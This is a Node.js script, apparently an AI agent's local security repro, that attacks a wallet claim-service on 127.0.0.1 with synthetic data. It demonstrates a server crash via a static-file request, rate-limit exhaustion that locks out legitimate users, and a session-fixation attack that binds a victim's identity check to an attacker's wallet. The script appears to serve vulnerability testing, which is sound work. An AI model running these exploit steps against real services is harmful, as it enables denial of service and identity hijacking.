// Local-only repro against the claim-service code (demo mode, synthetic data, 127.0.0.1).
import {createClaimServer} from '/tmp/claude-0/-home-user-heli-experiment/372631ff-9692-57b0-8e7c-832671151870/scratchpad/run/heli/claim-service/server.mjs';
import {ClaimAdmission} from '/tmp/claude-0/-home-user-heli-experiment/372631ff-9692-57b0-8e7c-832671151870/scratchpad/run/heli/claim-service/admission.mjs';
import {storage} from '/tmp/claude-0/-home-user-heli-experiment/372631ff-9692-57b0-8e7c-832671151870/scratchpad/run/heli/claim-service/storage.mjs';
import {web3} from '/tmp/claude-0/-home-user-heli-experiment/372631ff-9692-57b0-8e7c-832671151870/scratchpad/run/heli/mobile/deps.mjs';
import {generateKeyPairSync,randomUUID,sign} from 'node:crypto';
import {createPublicKey} from 'node:crypto';
const kpGen=()=>{const {privateKey}=generateKeyPairSync('ed25519');const pub=new web3.PublicKey(createPublicKey(privateKey).export({format:'der',type:'spki'}).subarray(-32));return {publicKey:pub,priv:privateKey};};
const scenario=process.argv[2];
const data=storage(':memory:');
const provider={decisions:new Map(),async create(id){const pid=randomUUID();this.decisions.set(pid,{session_id:pid,vendor_data:id,workflow_id:'local-demo',status:'Not Started'});return {id:pid,url:'https://verify.didit.me/session/x'};},async decision(id){return this.decisions.get(id);}};
const admission=new ClaimAdmission({program:'HkScyzYb2nyhw9X8o31ShQTEFgbuKQj2ThBTBErBJAWv',workflowId:'local-demo',applicationId:'local-demo',provider,personSecret:'x'.repeat(40),verifierKey:generateKeyPairSync('ed25519').privateKey,data});
const port=18000+Math.floor(Math.random()*1000),origin='http://127.0.0.1:'+port;
const server=createClaimServer({origin,admission,data,mode:'demo'});
await new Promise(r=>server.listen(port,'127.0.0.1',r));
const post=(p,b)=>fetch(origin+p,{method:'POST',headers:{'content-type':'application/json',origin},body:JSON.stringify(b)}).then(async r=>({code:r.status,body:await r.json()}));
async function apply(kp,person){const s=(await post('/api/session',{wallet:kp.publicKey.toBase58()})).body;const sig=sign(null,Buffer.from(s.message),kp.priv).toString('base64');await post('/api/authenticate',{id:s.id,token:s.token,signature:sig});if(person)await post('/api/demo/verify',{id:s.id,token:s.token,person});return s;}
if(scenario==='crash'){
 process.on('exit',c=>console.log('process exit code',c));
 const r=await fetch(origin+'/style.css');console.log('GET /style.css',r.status);
 try{const x=await fetch(origin+'/web3.js');console.log('GET /web3.js',x.status);}catch(e){console.log('GET /web3.js client error:',e.cause?.code??e.message);}
 await new Promise(r=>setTimeout(r,300));console.log('server still alive?');process.exit(0);
}
if(scenario==='ratelimit'){
 let last;for(let i=0;i<120;i++)last=await post('/api/session',{wallet:kpGen().publicKey.toBase58()});
 const legit=await post('/api/session',{wallet:kpGen().publicKey.toBase58()});
 const hook=await fetch(origin+'/webhooks/didit',{method:'POST',headers:{'content-type':'application/json'},body:'{}'});
 console.log('after 120 attacker POSTs: legit user',legit.code,legit.body.error,'| webhook endpoint',hook.status);process.exit(0);
}
if(scenario==='fixation'){
 const attacker=kpGen(),victim=kpGen();
 const a=await apply(attacker,null); // attacker creates + authenticates own application, does NOT verify
 // victim opens attacker-supplied link https://site/#application={"id":a.id,"token":a.token}; app.js overwrites localStorage and continues it
 await post('/api/demo/verify',{id:a.id,token:a.token,person:'VICTIM-DOC-1'}); // victim completes "their" identity check
 const st=(await post('/api/status',{id:a.id,token:a.token})).body;
 console.log('hijacked application status',st.status,'wallet==attacker',st.wallet===attacker.publicKey.toBase58());
 const v=await apply(victim,'VICTIM-DOC-1');
 console.log('victim own application status',(await post('/api/status',{id:v.id,token:v.token})).body.status);
 process.exit(0);
}
